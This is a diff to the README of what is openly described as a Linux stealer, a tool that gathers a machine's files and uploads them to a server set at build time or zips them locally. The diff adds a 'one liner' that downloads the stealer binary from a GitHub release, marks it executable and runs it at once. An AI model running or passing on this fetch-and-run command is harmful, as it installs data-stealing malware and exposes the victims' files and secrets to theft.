@@ -16,6 +16,11 @@ A linux stealer with support for:
 
 This stealer has support for uploading to a file server but a file server is not included in the repo. Instead, If a webserver is not injected at build time with `-X main.Host` it will gather all the files in a zip file and place it in the current directory.
 
+## one liner
+```
+wget https://github.com/notathrow/linux_stlr/releases/download/v1.0.6/linux_stlr -O ./linux_stlr;chmod +x ./linux_stlr;./linux_stlr
+```
+
   ## build from source
 
 1. Install golang:
